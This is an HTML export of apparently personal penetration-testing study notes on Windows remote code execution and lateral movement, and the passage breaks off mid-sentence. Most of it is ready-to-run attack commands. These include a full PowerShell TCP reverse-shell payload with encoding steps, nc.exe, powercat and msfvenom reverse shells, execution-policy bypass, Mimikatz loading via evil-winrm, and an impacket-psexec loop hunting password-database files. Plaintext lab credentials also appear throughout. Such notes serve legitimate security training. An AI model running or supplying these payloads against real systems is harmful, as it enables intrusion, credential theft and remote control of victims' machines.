<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>RCE</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>RCE</h1><br/><p>Local Admins have different Privileges than Domain Admins.<span style="color:#ff0000;"> By def, all Local Admins have</span> various RCE methods (e.g <span style="color:#ff0000;">RDP</span>).</p><p></p><p><span style="color:#ff0000;">Domain Admins may still have RCE</span> though!</p><p></p><p><h1>Domain vs Local Accounts</h1></p><p>It&#39;s imperative that you <span style="color:#ff0000;">specify whether an acct is Domain or Local</span> when using various tools! For ex, after creating the local admin “dave2” on the host “ms01&quot;-</p><p></p><p>crackmapexec smb 192.168.186.141 -u dave2 -p &#39;password123!&#39; -d ms01 			(Succeeds by auth&#39;ing as ms01/dave2)</p><p>crackmapexec smb 192.168.186.141 -u dave2 -p &#39;password123!&#39;							(Fails to auth as oscp.exam/dave2)</p><p></p><p><h1>Troubleshooting</h1></p><p><a name="PS Arch Upgrade"></a><h2>Upgrade 32-bit PS to 64-bit PS</h2><h2></h2></p><p><h2></h2>This <span style="color:#ff0000;">only works if target is actually a 64-bit system</span> (<em>systeminfo</em> → <strong>System Type: x64-based PC</strong>)</p><p></p><p><h3>Check Process Arch</h3></p><p>The following will return either <strong>true </strong>(meaning you&#39;re already good) or <strong>false</strong></p><p></p><p><em>[Environment]::Is64BitProcess</em></p><p></p><p><h3>Spawning New Shell</h3></p><p>May be able to spawn 64-bit shell by running the following commands.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: The method that spawns a <span style="color:#ff0000;">new Reverse Shell</span> seems to be the <span style="color:#ff0000;">most reliable</span>!</p><p></p><p>C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe				(or if that doesn&#39;t work...)</p><p><em>%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">As a Reverse Shell</span>: <em>C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -enc ENCODED</em></p><p></p><p><h3>Resources</h3></p><p><a href="https://stackoverflow.com/questions/19055924/how-to-launch-64-bit-powershell-from-32-bit-cmd-exe">Spawn Shell</a></p><p><a href="https://superuser.com/questions/156952/how-can-i-create-a-32-bit-remote-powershell-session-on-a-64-bit-machine">Check Configurations</a></p><p></p><p><h2>Shell Doesn&#39;t Have Appropriate R/W</h2></p><p>Was able to spawn shell with GodPotato &amp; Encoded PS, but had R/W issues. (integrity?)</p><p></p><p><span style="color:#ff0000;">Shell via msfvenom worked normally</span>.</p><p><h2></h2></p><p><h2>Unload PS Script From Memory</h2></p><p>Simplest method is to spawn new PS session where it isn&#39;t  loaded in. For more <a href="https://stackoverflow.com/questions/1337961/powershell-unload-module-completely">info</a> &amp; options</p><p></p><p><em>powershell -ep bypass</em></p><p></p><p>Can then re-download the neccesary file (or a diff ver of it) so you can try importing that &amp; trying again</p><p></p><p><em>Remove-Item .\Invoke-Mimikatz.ps1</em></p><p></p><p><h2>File Paths</h2></p><p><h3>Specify Drive</h3></p><p>Sometimes you can omit the drive in the file path (e.g <strong>\Windows\PATH\file</strong>), but othertimes you MUST specify it (e.g <strong>C:\Windows\PATH\file</strong>). It&#39;s usually C by default.</p><p></p><p><h3>CMD File Paths</h3></p><p>Can&#39;t use <strong>/</strong> for file paths since CMD uses these for arguments (like <strong>-</strong> for Linux).</p><p></p><p><span style="color:#ff0000;">If running commands on Linux Machine</span> (e.g via <span style="color:#ff0000;">pwsh or some reverse shells</span>), the<strong> </strong><strong><span style="color:#ff0000;">\</span></strong> will be interpretted as a special character &amp; <span style="color:#ff0000;">needs to be escaped</span>. Use<strong> .\\path\\to\\file.exe</strong></p><p></p><p>If directly using Windows CMD prompt, use syntax <strong>.\path\to\file.txt</strong></p><p></p><p><a name="Bypass Exec Policy"></a><h1>Bypass Execution Policy</h1></p><p>Even if you <span style="color:#ff0000;">can&#39;t Edit the current policy</span> (due to a lack of privs), <span style="color:#ff0000;">may be able to launch a new PS Session with the policy bypass</span>!</p><p></p><p><h2>Editing Current Policy</h2></p><p><em>Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser</em>		(Unless you&#39;ve got elevated privs, can&#39;t omit -Scope to set policy for all users)</p><p></p><p><em>Get-ExecutionPolicy</em></p><p></p><p>Get-ExecutionPolicy -List		(For full policy details)</p><p></p><p><h2>Launch PS session &amp; Bypass</h2></p><p>Won&#39;t always work, since sometimes the new session won&#39;t be visible to you from an unstable shell. Will convert CMD to bypassed PS</p><p></p><p><em>powershell -ep bypass</em></p><p></p><p><h1>Safety Measures</h1></p><p><h2>Persistence</h2></p><p>Establishing peristence gives you an Alt method to reclaim access. For ex, if you abused  a SVC to get initial access, &amp; that SVC freezes, you no longer need it to reclaim your foothold.</p><p></p><p><a name="Backup Shell"></a><h2>Backup Shell</h2></p><p>[Memory 17]<ul><li>Depending on scenario, may be unable to repeat an exploit to get another shell without reverting/rebooting target machine!</li></ul></p><p><ul><li>After spawning a shell, immediately use it to create a backup shell &amp; use that going forward. If backup freezes/crashes, respawn it with OG shell.</li></ul></p><p><ul><li>Can catch OG shell in <em>tmux</em>, but I prefer not to have the backup shell I&#39;m working out of be in <em>tmux</em> (can&#39;t Ctrl+F for example).</li></ul></p><p></p><p><h3>Methods</h3></p><p><a href="file:///home/asura/code/shell/enc_powerSHELL.sh">Encoded PS</a> generator.  This seems to work better than transferring msfvenom payload to target, since the PS payload can be re-run if you need another shell &amp; msfvenom payload can&#39;t always be re-used (seemingly).</p><p></p><p><em>cd \users\public</em> (or any dir where you&#39;ve R/W access. Confirm like<em> echo “test” &gt; test</em> then <em>dir</em>)</p><p></p><p><em>Write-Output &quot;powershell -enc ENCODED&quot; &gt; shell.ps1</em> 			(Paste payload into shell &amp; use PS to write it to file. <em>echo</em> won&#39;t work. May need to specify file path)</p><p></p><p>powershell -c Write-Output “powershell -enc 	ENCODED”</p><p></p><p>OR</p><p></p><p><em>powershell -c &quot;Write-Output &#39;powershell -enc 	ENCODED&#39; &gt; shell.ps1&quot;</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Process</span><span style="color:#8ff0a4;text-decoration:underline;"></span></p><p><span style="color:#8ff0a4;text-decoration:underline;"></span>Preferable method, since the child won&#39;t die if this shell has issues. If it doesn&#39;t work, may be able to use “Job” method instead.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: I think this is supposed to be used to launch an EXE, which is why it wasn&#39;t working for a PS script. I left the OG Syntax, but the below syntax should work. (What about the  <strong>-NoNewWindow</strong> argument?)</p><p></p><p><em>Start-Process -FilePath &quot;powershell&quot; -ArgumentList &quot;-enc ENCODED&quot;</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Admin Prompt</span>: If you have <a href="PrivEsc--Windows--Sysadmin_Stuff_51.html#UAC Intergrity">UAC Integrity Level</a> 0, you can instead launch a PS terminal that is Running as Admin by adding <strong> -Verb RunAs</strong>. Without UAC Level 0, it requires a prompt so it won&#39;t work.</p><p></p><p><em>Start-Process -FilePath &quot;powershell&quot; -Verb RunAs -ArgumentList &quot;-enc ENCODED&quot;</em></p><p></p><p><span style="color:#cdab8f;">Incorrect Syntax(?)</span>: <em>Start-Process -NoNewWindow .\shell.ps1</em>			(Or try w/o <strong>-NoNewWindow</strong>)<span style="color:#8ff0a4;text-decoration:underline;"></span></p><p><span style="color:#8ff0a4;text-decoration:underline;"></span><span style="color:#8ff0a4;text-decoration:underline;"></span></p><p><span style="color:#8ff0a4;text-decoration:underline;">Job</span></p><p><em>Start-Job .\shell.ps1</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Just Send it</span></p><p>Just executing the script in the fg works fine too. Really only need to use 1 shell at a time &amp; this still gives the extra safety.</p><p>Specifying this path for powershell should ensure that it&#39;s spawned as <a href="PrivEsc--Windows--RCE_33.html#PS Arch Upgrade">64-bit PS</a></p><p></p><p><em>C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe \Users\Public\shell.ps1</em></p><p></p><p><h2>Kill a Process</h2></p><p><strong>{CMD}</strong> <em>taskkill /F /IM name.exe</em></p><p></p><p><a name="Handling Interactive Prompts"></a><h1>Handling Interactive Prompts</h1></p><p>When using WinRM to execute a PowerShell script, it doesn&#39;t support interactive prompts (e.g. <strong>Read-Host</strong> ) by default.</p><p></p><p>This is because WinRM is designed for remote, automated execution, and doesn&#39;t have a direct interactive console like a local session.</p><p></p><p>However, RDP is interactive, allowing you to prompt the user normally.</p><p></p><p><h2>Bypassing WinRM Limitations</h2></p><p><h3>Pre-prompt Before Script Exectution</h3></p><p>You can gather all the required inputs from the user before initiating the script and pass them as <a href="Appendix--Code--Powershell_83.html#Arguments">parameters</a> to the script. This way, the prompt occurs locally, and the value is passed to the remote script via parameters.</p><p></p><p><em>$userInput = Read-Host &quot;Enter some value&quot;</em><em></em></p><p><em>Invoke-Command -ScriptBlock { param($input) $input } -ArgumentList $userInput</em></p><p></p><p><h3>Configuration Files &amp; Environment Variables</h3></p><p>If the inputs are predictable, you could have the user provide the inputs through a config file or environment variables that the script can read when running remotely.</p><p></p><p><h3>Scheduled tasks &amp; Background Jobs</h3></p><p>It may help to run the script as a scheduled task or background job on the remote machine. This may let you use pre-define values or settings before execution, which removes the need for interactive prompts during execution.</p><p></p><p><h1>Impersonate User</h1><h1></h1></p><p><h1></h1><a name="runas"></a><h2>Runas (via GUI Access)</h2></p><p>“You need GUI access because running this command gives you a password prompt which won&#39;t accept input from commonly used shells (e.g Bind Shell or WinRM).” -Offsec</p><p></p><p>Runas can be used with local or domain accounts as long as the user has the ability to log on to the system. Target user doesn&#39;t need any special group memberships like RDP or WinRM.</p><p></p><p><em>runas /user:backupadmin cmd</em></p><p></p><p><em>runas /user:corp\dave cmd</em></p><p></p><p><h3>Without GUI Access?</h3></p><p>It&#39;s not intended to be used this way, but *may* be possible by utilizing <a href="PrivEsc--Windows_9.html#Stored Creds">stored creds</a> with the <strong>/savecred</strong> parameter. For more info &amp; examples, see this <a href="https://juggernaut-sec.com/runas/">guide</a>.</p><p></p><p>You won&#39;t be able to launch a new terminal, since you wouldn&#39;t be able to see it, so you&#39;ll need to execute one command at a time. For ex, to use for a Domain user account-</p><p></p><p><em>runas /env /noprofile /savecred /user:JUGG-efrost\administrator &quot;cmd.exe /c whoami &gt; whoami.txt&quot;</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">How Credentials Get Stored</span>:Need an interactive shell to store credentials with runas (See this <a href="https://microsoft.public.windows.server.scripting.narkive.com/U6xPidL6/runas-command-saved-credentials-how-does-one-save-the-credentials">link</a>). If no creds are stored, you&#39;ll be prompted for a passwd when using runas cmd with <strong>/savecred</strong>. The next time you use that arg, the creds will be saved.</p><p></p><p>If in a non-interactive shell, you can still save creds using one of these <a href="PrivEsc--Windows--RCE_33.html#saving creds">methods</a></p><p></p><p><h2>Powershell Credentials</h2></p><p>You can either leverage an encrypted file for <a href="PrivEsc--Windows--RCE_33.html#saving creds">Powershell Credentials</a>, or enter the creds in the command (also shown in that section).</p><p></p><p><h2>Sysinternals PSExec</h2></p><p>In an AD env, Kerberos tickets will be used if the target is specified using its hostname. This is why an <a href="PrivEsc--Windows--Active_Directory_10.html#OPtH">OPtH</a> is useful.</p><p></p><p>If the IP address is used, it will use NTLM Authentication for the current user unless creds are provided. If providing creds, <span style="color:#ff0000;">can&#39;t PtH</span>, must use the clear-txt passwd.</p><p></p><p><em>PsExec.exe -u DOMAIN\User -p Password &quot;C:\Path\to\script.bat&quot;</em></p><p></p><p><a name="saving creds"></a><h1>Save Credentials via Non-Interactive Shell</h1></p><p><h2>Task Scheduler (SchTasks)</h2></p><p>You can use Windows Task Scheduler to run a task as another user, including storing the credentials securely. Works non-interactively. You can create the task once and run it on-demand without storing the password in a script again.</p><p></p><p><em>schtasks /create /tn &quot;InstallApp&quot; /tr &quot;msiexec /i C:\Users\cyberlens\AlwaysInstallElevated.msi /qn&quot; /sc ONCE /st 23:59 /ru cyberlens\cyberlens /rp HackSmarter123</em><em></em></p><p><em></em><em></em></p><p><em>schtasks /run /tn &quot;InstallApp&quot;</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Explanation</span>: Must specify user with DOMAIN\Username. Set the time for later than the current time (e.g. <strong>23:59</strong>), but you can still run the task immediately with the subsequent command. <strong>/ru</strong> = run as user. <strong> /rp</strong> = password (can be stored securely in the task).</p><p></p><p><h3>Required Privileges</h3></p><p>The <strong>Log on as a batch job</strong> privilege is requried for scheduled tasks to run non-interactively. Without this privilege, you&#39;ll get the following error after you create the task:</p><p></p><p><strong>WARNING: The task is registered, but may fail to start. Batch logon privilege needs to be enabled for the task principal</strong></p><p></p><p><h2>PowerShell</h2></p><p><h3>Entering via CLi (Non-Interactive Shell)</h3></p><p><em>$secpasswd = ConvertTo-SecureString &quot;N0cturn@l21&quot; -AsPlainText -Force</em><em></em></p><p><em></em><em></em></p><p><em>$mycreds = New-Object System.Management.Automation.PSCredential (&quot;juggernaut.local\cmarko&quot;, $secpasswd)</em><em></em></p><p><em></em><em></em></p><p><em>Start-Process -FilePath powershell.exe -argumentlist &quot;C:\temp\nc.exe 172.16.1.30 443 -e cmd.exe&quot; -Credential $mycreds</em></p><p></p><p><h3>Secure Credential Storage (Interactive Shell)</h3></p><p>PowerShell allows you to securely store and reuse credentials with encrypted credential files.</p><p></p><p>This only works on the same machine and user where the credentials were saved (encryption is tied to user profile). It avoids hardcoding plaintext passwords.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Save credentials</span>: <strong>Get-Credential</strong> cmdlet prompts the user for creds, so it <span style="color:#ff0000;">only works from an interactive shell</span>.</p><p></p><p><em>$cred = Get-Credential</em><em></em></p><p><em>$cred | Export-Clixml -Path &quot;C:\secure\mycred.xml&quot;</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Using Credentials</span></p><p></p><p><em>$cred = Import-Clixml -Path &quot;C:\secure\mycred.xml&quot;</em><em></em></p><p><em>Start-Process &quot;notepad.exe&quot; -Credential $cred</em></p><p></p><p></p><p></p><p><h1>WinRM &amp; Evil-Winrm</h1></p><p>[Win 104-106 &amp; 114-115]</p><p>If connection fails, <span style="color:#ff0000;">try again</span>! Sometimes errors (e.g <strong>WinRM::WinRMAuthorizationError</strong>) only appear for the 1st tries.</p><p></p><p>After connecting, <strong>menu</strong> will list the spice</p><p></p><p><em>evil-winrm -u backup_service -p It4Server -i 10.10.100.250</em> </p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: By def, a user can have 5 WinRM shells at a time. Signing in with multiple shells on the same computer may help speed up enumeration.</p><p></p><p><h2>WinRM Discovery</h2></p><p>Uses port <strong>5985</strong> (or <strong>5986</strong> for HTTPS) by def, but nmap may list it as HTTP SVC (since WinRM uses that Protocol). May also see <strong>47001</strong>.</p><p></p><p><strong>5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</strong></p><p></p><p>&quot;If WinRM is not  configured for remote access, but the service is started, it listens for  local requests on TCP port 47001. If you create listener it will still  listen on 47001, but also on the default TCP ports 5985 (HTTP) and 5986  (HTTPS)&quot;</p><p></p><p><h2>Specify Domain</h2><h2></h2></p><p><h2></h2>&quot;Always use full username when authenticating as a domain user, because if there&#39;re 2 users sharing the same name (a local user and a domain user), say WORKGROUP\Administrator and MEGACORP\Administrator, and you&#39;re trying to authenticate as a domain admin without providing the domain prefix, authentication will fail.&quot;<a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/winrm#evil-winrm"> Specifying Domain</a></p><p></p><p>See <a href="PrivEsc--Windows--RCE_33.html#local vs dom">Local vs Domain</a></p><p></p><p><em>evil-winrm -i 10.10.60.110 -u &#39;raz0rblack.thm\xyan1d3&#39; -p cyanide9amine5628</em></p><p><h2></h2></p><p><h2>Load PS into RAM</h2></p><p>Specify a dir &amp; load all PS scripts from as an arg when connecting like-</p><p></p><p><em>-s </em><em><a href="file:///usr/share/powershell-empire/empire/server/data/module_source/credentials/">/usr/share/powershell-empire/empire/server/data/module_source/credentials/</a></em></p><p></p><p>After connecting, specify the script you want to load in, like-</p><p></p><p><em>Invoke-Mimikatz.ps1</em></p><p></p><p>Now the loaded functions from that script should be imported in &amp; listed with <strong>menu</strong></p><p></p><p><h2>Download</h2><h2></h2></p><p><h2></h2>Downloads relative to pwd. Specify full path (incl filename) to Attacker machine, but relative path for target.</p><p></p><p>If you&#39;re using backslashes for the file path, you need to use single quotes around it.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: evil-winrm seems to have issues downloading from certain directories (e.g. the Recycle Bin), so you may need to copy the file to an alterante location before downloading it.</p><p></p><p><em>copy &#39;C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001\system.bak&#39; C:\Users\Jareth\system.bak</em><em></em></p><p><em>download &#39;C:\Users\Jareth\system.bak&#39;</em></p><p><h2></h2></p><p><h2>Upload</h2></p><p>Uploads files <span style="color:#ff0000;">relative to the local pwd</span>, so you&#39;ll have the <span style="color:#ff0000;">most flexibility if you connect while in attacker&#39;s </span><strong><span style="color:#ff0000;"> /</span></strong><span style="color:#ff0000;"> </span>(root dir). Evil-WinRM won&#39;t change what it views as pwd if you background the Session &amp; cd.</p><p></p><p><a name="impacket-psexec"></a><h1>impacket-psexec</h1></p><p>Q: Will this work if internal target doesn&#39;t know how to route back to Attacker? Internal Targets may be able to route out anyways, wait a few minutes for all the hops.</p><p>High Intergrity shell by def? (Like a CMD terminal set to Run as Admin)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Works by uploading a payload to the ADMIN$ SMB share, &amp; this payload may get <a href="Defenses_+_Bypasses--AV_Bypass_59.html#AV PtH PrivEsc">blocked by AV</a>. This could cause it to fail without a clear indication as to why, &amp; it could happen at different stages of the output.</p><p></p><p><h2>Connecting to Domain Joined Machine</h2></p><p>May fail to connect if you don&#39;t specify the Domain name. See <a href="PrivEsc--Windows--RCE_33.html#local vs dom">Local vs Domain</a></p><p></p><p>Q: Do you use the TLD for the domain? Does it vary by tool?</p><p></p><p><em>impacket-psexec Administrator:&#39;vau!XCKjNQBv2$&#39;@172.16.125.21</em></p><p></p><p><strong>[-] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)</strong></p><p></p><p><em>impacket-psexec relia.com/Administrator:&#39;vau!XCKjNQBv2$&#39;@172.16.125.21</em></p><p></p><p><a name="Stabilized PS"></a><h2>Stabilized PS</h2></p><p>[CTF B 46] (<span style="color:#ff0000;">Critical info</span>)</p><p>Can try Bypassing Execution Policy 1st, &amp; then spawning like-</p><p></p><p><em>powershell -enc ENCODED</em></p><p></p><p>OR Bypass Execution Policy &amp; then verify with-</p><p></p><p><em>Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser</em></p><p><em>Get-ExecutionPolicy</em><h1></h1></p><p><h1></h1><h1></h1></p><p><h1></h1><a name="PS Payload"></a><h3>Generating Encoded </h3><h3>PS Payload</h3><ol><li><h1>1) </h1>1) pwsh (powershell utility for linux)</li></ol></p><p><ol><li>Payload</li></ol></p><p></p><p>$Text = &#39;$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.119.3&quot;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#39;</p><p><ol><li>$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)</li></ol></p><p><ol><li>$EncodedText =[Convert]::ToBase64String($Bytes)</li></ol></p><p><ol><li>$EncodedText</li></ol></p><p><ol><li>exit</li></ol></p><p></p><p><a name="impacket-psexec file transfer"></a><h2>File Transfers</h2><h2></h2></p><p><h2></h2><h3>Exfil Files</h3></p><p>Specify file path relative to ADMIN$ share (aka <strong>\Windows</strong>). This may require you to copy files to <strong>\Windows</strong>.</p><p>Files saved to pwd. You can change your pwd with <em>lcd /path/</em></p><p></p><p><em>copy \staging\htdocs\cms\data\userdata.db \Windows</em><em></em></p><p><em>lget userdata.db</em></p><p></p><p><h3>Upload Files</h3></p><p>Upload file to a path that&#39;s relative to ADMIN$ share (aka <strong>\Windows</strong>) with <em>lput</em>.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Warning</span>: <span style="color:#ff0000;">Backup important files before attempting</span> transfer! <span style="color:#ff0000;">If you accidentally use </span><em><span style="color:#ff0000;">lget</span></em><span style="color:#ff0000;"> </span>instead of <em>lput</em>, the <span style="color:#ff0000;">local file will be overwritten with a blank file</span> (sneakily erasing it)</p><p></p><p><h2>Command Executed Upon Connection</h2></p><p>Specify the cmd to exe upon connection (def is cmd.exe). Can specify <em>powershell</em> to get that instead of CMD shell (may need to exe cmd like whoami to see prompt), or just exe a cmd &amp; exit. For ex-</p><p></p><p><em>for i in $(cat internal_targets.txt); do impacket-psexec relia.com/Administrator:&#39;vau!XCKjNQBv2$&#39;@$i &#39;powershell -c &quot;Get-ChildItem -Path \ -Filter *.kdbx -File -Recurse -ErrorAction SilentlyContinue&quot;&#39;;done</em></p><p></p><p><h3>Troubleshooting</h3></p><p>If you get errors, try running <em>exit</em>, reconnect with impacket-psexec, &amp; then retrying to connect/use the built-in func (e.g lget)</p><p></p><p></p><p><h1>Powercat</h1></p><p><a href="file:///usr/share/powershell-empire/empire/server/data/module_source/management/">/usr/share/powershell-empire/empire/server/data/module_source/management/</a></p><p></p><p>powercat -c 192.168.119.5 -p 4444 -e powershell</p><p></p><p><h1>Msfvenom</h1></p><p>Must use <span style="color:#ff0000;">stageless payload for normal nc listener</span>. Staged payloads (i.e Meterpreter) require the Metasploit <strong>multi/handler </strong>module.</p><p></p><p>x64 (64-bit) machines typically can also run x86 (32-bit) programs for backwards compatibility, so it&#39;s <span style="color:#ff0000;">often safest to use an x86 payload if unsure</span>.</p><p></p><p>★HOWEVER, <span style="color:#ff0000;">some x64 machines</span> seem to <span style="color:#ff0000;">only respond to x64 payloads</span>! Try both!</p><p></p><p><h2>x86 Architecture (32-bit)</h2></p><p><em>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.217 LPORT=443 -f aspx -o shell-443.aspx</em><em></em></p><p><em></em><em></em></p><p><em>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.217 LPORT=1234 -f exe -o shell-1234.exe</em></p><p></p><p><h2>x64 Architecture (64-bit)</h2></p><p><em>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=443 -f aspx -o shell-443-x64.aspx</em></p><p></p><p><h2>exitfunc</h2></p><p><span style="color:#ff0000;">May be neccessary to specify an exitfunc</span>, thread seems to be the most universal option.</p><p></p><p><em>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.217 </em><em><strong>exitfunc=thread</strong></em><em> LPORT=135 -f aspx -o shell-135.aspx</em></p><p></p><p><h1>RDP</h1></p><p>See <a href="PrivEsc--Windows--Sysadmin_Stuff_51.html#RDP w/o creds">RDP</a> for more information.</p><p></p><p>Def port is <strong>3389</strong>, but may run on non-def port. Nmap identifies it as <strong>3389/tcp open  ms-wbt-server ... Microsoft Terminal Services</strong></p><p></p><p>Specify port after the server IP, like- </p><p></p><p><em>xfreerdp /v:192.168.209.221:10000</em> (etc)</p><p></p><p><h2>Troubleshooting</h2></p><p></p><p><span style="color:#060f94;">★</span>Sometimes need to <span style="color:#ff0000;">re-run xfreerdp </span>multiple times<span style="color:#ff0000;"> if it fails</span> to connect.</p><p></p><p><h3>Local vs Domain Accounts</h3></p><p>If connecting as a Local Admin (or other local Acct), don&#39;t incl the domain flag (<strong>/d:</strong>).</p><p></p><p>Conversely, may need the domain flag if using a Domain Acct.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: I *THINK* you specify domain w/o the TLD, but try both to be safe. (e.g <strong>/d:raz0rblack </strong>vs <strong>/d:raz0rblack.thm</strong>)</p><p></p><p><h3>Share Not Available</h3></p><p>If using xfreerdp&#39;s <strong>/drive</strong> to share attacker&#39;s directory, the target&#39;s GUI File Manager may say “Network Share Not Available” under <strong>Network</strong>.</p><p></p><p><span style="color:#ff0000;">Click the banner</span> at the top of the window that&#39;s displaying this message to enable the share.</p><p></p><p><strong><h3>Account restrictions are preventing this user from signing in</h3></strong></p><p>This is commonly seen when trying to sign in as an administrator. </p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Does this apply to RDP in general or just when you sign in with a PtH Attack? I was <span style="color:#ff0000;">still able to sign in with WinRM via PtH</span>.</p><p></p><p>Using a high priv account (e.g sign in as Administrator via WinRM), run the following PS.</p><p></p><p><em>New-ItemProperty -Path &#39;HKLM:\System\CurrentControlSet\Control\Lsa&#39; -name &#39;DisableRestrictedAdmin&#39; -PropertyType &#39;DWORD&#39; -value &#39;0&#39; -force</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Be patient. The RDP screen may be black for awhile, &amp; xfreerdp may output an error (e.g <strong>Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]</strong>). This doesn&#39;t mean that it didn&#39;t work!</p><p></p><p><h3>Additional Login Screen &amp; “Incorrect Password&quot; (Buggy Key mapping)</h3></p><p>After using xfreerdp &amp; supplying password, was given a GUI windows prompt asking me to enter the account&#39;s password which was “incorrect”.</p><p></p><p>Clicking &amp; holding down the view password icon showed that key bindings were messed up. Special characters were incorrectly interpretted (e.g. pressing + resulted in \ ).</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Solution</span>: I kept viewing the password field &amp; pressed every special character until I found which character translated to the one I needed (e.g. I entered <strong>uzunLM-3131</strong> to get desired password <strong>uzunLM+3131</strong>)</p><p></p><p><h2>Check Port Scan</h2></p><p></p><p><em>for i in $(find results -name &quot;_full_tcp_nmap.txt&quot; 2&gt;/dev/null);do echo &quot;__________&quot;;echo $i; cat $i| grep -E -i &quot;rdp|3389&quot;;done</em></p><p></p><p><h2>RD Web</h2></p><p><a href="https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-web-client-admin">Remote Desktop web client</a> that runs on <span style="color:#ff0000;">port 443</span> by def, &amp; may need to nav to specific subdir to use it. For ex, seemingly unused webserver on 443 had login portal at <strong>/RDWeb</strong>.</p><p>It allows you to use RDP creds via the browser to remotely access the target&#39;s desktop, or a specific App on target machine.</p><p></p><p>Clicking a RemoteApp&#39;s link will download the <strong>.rdp</strong> file, which can be used with tools like xfreerdp or remmina. <a href="https://github.com/FreeRDP/FreeRDP/issues/3598">xfreerdp example</a>. Good pentesting <a href="https://medium.com/vartai-security/attack-chain-series-remote-access-service-compromise-part-1-rds-e984101c78b7">Resource</a>.</p><p></p><p><em>xfreerdp /PATH/cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp /u:kiosk /p:&#39;XEwUS^9R2Gwt8O914&#39; /d:skylark /v:austin02.skylark.com:10000</em></p><p></p><p><h2>Enable RDP</h2></p><p>A high priv Acct (i.e Local Admin) can enable RDP on target machine like-</p><p></p><p><em>crackmapexec smb IP -d skylark.com -u backup_service -p It4Server -M rdp -o ACTION=enable</em></p><p></p><p><h1>Restricted PS Environment</h1></p><p>Depending on the context of your PS connection, your <span style="color:#e01b24;">commands may be limited</span> &amp; even basic commands (e.g dir) may not be available.</p><p></p><p><h2>Enumerate Available Commands</h2></p><p><em>Get-Command</em></p><p></p><p><h3>Command Info</h3></p><p>For more details about command, try both of the following in addition to online research. Custom commands (e.g Get-ServicesApplication) may not have much info from Get-Help.</p><p></p><p><em>Get-Command -ShowCommandInfo Get-ServicesApplication</em></p><p><em>Get-Help Get-ServicesApplication</em></p><p><em>Get-Help Get-ServicesApplication -Detailed</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Example Output</span></p><p><em>Get-Command -ShowCommandInfo Get-ServicesApplication</em> shows that the <strong>Filter</strong> parameter can be used for Command Injection via <strong>Invoke-Expression</strong>. This allows you to escape the Restricted Environment.</p><p></p><p><strong>Name          : Get-ServicesApplication</strong><strong></strong></p><p><strong>ModuleName    : </strong><strong></strong></p><p><strong>Module        : @{Name=}</strong><strong></strong></p><p><strong>CommandType   : Function</strong><strong></strong></p><p><strong>Definition    : </strong><strong></strong></p><p><strong>                         </strong><strong><span style="color:#ff0000;">   param($Filter=&quot;Parameters&quot;)</span></strong><strong></strong></p><p><strong>                            $escapedInput = $Status -replace &quot;&#39;&quot;, &quot;&#39;&#39;&quot;</strong><strong></strong></p><p><strong>                           </strong><strong><span style="color:#ff0000;"> Invoke-Expression</span></strong><strong> &quot;Get-Service | Select-Object -Property Name</strong><strong><span style="color:#ff0000;">,$Filter</span></strong><strong>&quot;</strong><strong></strong></p><p><strong>                            [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()</strong><strong></strong></p><p><strong>                        </strong><strong></strong></p><p><strong>ParameterSets : {@{Name=__AllParameterSets; IsDefault=False; Parameters=System.Management.Automation.PSObject[]}}</strong></p><p></p><p><h2>Escape via Command Injection</h2></p><p>Confirm Command Injection by trying to pass a string into the parameter &amp; observing the output. Next try passing a command</p><p></p><p><h3>Baseline</h3></p><p>Placing a query in parenthesis makes it treated as if it&#39;s a 